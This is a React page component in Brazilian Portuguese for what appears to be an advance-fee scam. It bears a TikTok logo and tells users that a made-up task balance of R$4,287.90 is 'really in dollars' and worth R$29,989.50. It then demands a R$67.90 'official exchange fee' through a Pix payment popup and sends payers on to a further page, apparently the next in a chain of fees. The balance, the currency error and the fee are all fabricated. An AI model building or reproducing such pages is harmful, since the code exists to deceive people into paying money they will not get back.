import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import ZyroPayPixPopup from '@/components/ZyroPayPixPopup';
import PageTransition from '@/components/PageTransition';
import { trackViewContent } from '@/lib/tiktokPixel';
import '../styles/app.css';

const SALDO_ATUAL = 4287.90;
const SALDO_CONVERTIDO = 29989.50;
const TAXA_CAMBIO = 67.90;
const TAXA_CAMBIO_CENTAVOS = 6790;

const formatBR = (value: number) => {
  return value
    .toFixed(2)
    .replace('.', ',')
    .replace(/\B(?=(\d{3})+(?!\d))/g, '.');
};

const Up5 = () => {
  const navigate = useNavigate();
  const [showPixPopup, setShowPixPopup] = useState(false);

  useEffect(() => {
    trackViewContent('Taxa de Câmbio', TAXA_CAMBIO);
  }, []);

  const handlePaymentSuccess = () => {
    setShowPixPopup(false);
    navigate('/up6');
  };

  return (
    <PageTransition>
      <main className="upsell-page">
        {/* Header */}
        <div className="upsell-header">
          <img src="/images/tiktok-logo.png" alt="TikTok" className="upsell-logo" />
        </div>

        {/* Alert Card */}
        <div className="upsell-card upsell-card-center">
          <div className="flag-emoji">🇺🇸</div>

          <h1 className="alert-heading">
            PARE! SEU SALDO NÃO É DE R$ {formatBR(SALDO_ATUAL)}. O SISTEMA IDENTIFICOU QUE O VALOR ORIGINAL ESTÁ EM DÓLARES!
          </h1>

          <p className="upsell-text-muted">
            Acabamos de receber um alerta do servidor internacional. As tarefas foram patrocinadas por empresas americanas e seu saldo foi mostrado na moeda errada.
          </p>
        </div>

        {/* What it means Card */}
        <div className="upsell-card">
          <h2 className="card-section-title">O que isso significa?</h2>

          <div className="check-list">
            {[
              'Seu saldo real é 5 VEZES MAIOR que o mostrado.',
              'O valor está travado em Dólares (USD).',
              'Necessário realizar a conversão imediata para Sacar.',
            ].map((item, idx) => (
              <div key={idx} className="check-item">
                <div className="check-icon">✓</div>
                <span>{item}</span>
              </div>
            ))}
          </div>
        </div>

        {/* Math Card */}
        <div className="upsell-card">
          <h2 className="card-section-title">A Matemática da Conversão:</h2>

          <div className="math-row math-row-border">
            <span>Saldo Atual Visualizado</span>
            <span className="math-value">R$ {formatBR(SALDO_ATUAL)}</span>
          </div>

          <div className="math-row math-row-highlight">
            <span>Fator Multiplicador (USD)</span>
            <span className="math-value math-value-orange">5x (Cotação Atual)</span>
          </div>

          <div className="math-row math-row-border">
            <span>Status da Conversão</span>
            <span className="math-value math-value-red">Pendente</span>
          </div>

          <div className="math-row math-row-total">
            <span className="math-label-bold">NOVO SALDO<br />CONVERTIDO:</span>
            <div className="saldo-converted">
              <span className="currency-small">R$</span>
              <span className="saldo-int">{formatBR(SALDO_CONVERTIDO).split(',')[0]},</span>
              <span className="saldo-dec">{formatBR(SALDO_CONVERTIDO).split(',')[1]}</span>
            </div>
          </div>
        </div>

        {/* CTA Card */}
        <div className="upsell-card upsell-card-center">
          <p className="upsell-text">
            Para corrigir isso e converter o valor total para sua conta bancária brasileira, precisamos pagar a Taxa de Câmbio Oficial.
          </p>

          <button
            onClick={() => setShowPixPopup(true)}
            className="cta-button cta-primary cta-rounded"
          >
            PAGAR TAXA DE CÂMBIO E SACAR R$ {formatBR(SALDO_CONVERTIDO)}
          </button>

          <p className="cta-footnote">
            Valor da taxa de conversão: R$ {formatBR(TAXA_CAMBIO)}
          </p>
        </div>

        {showPixPopup && (
          <ZyroPayPixPopup
            amount={TAXA_CAMBIO_CENTAVOS}
            description="Taxa de Câmbio Oficial"
            onSuccess={handlePaymentSuccess}
            onClose={() => setShowPixPopup(false)}
          />
        )}
      </main>
    </PageTransition>
  );
};

export default Up5;
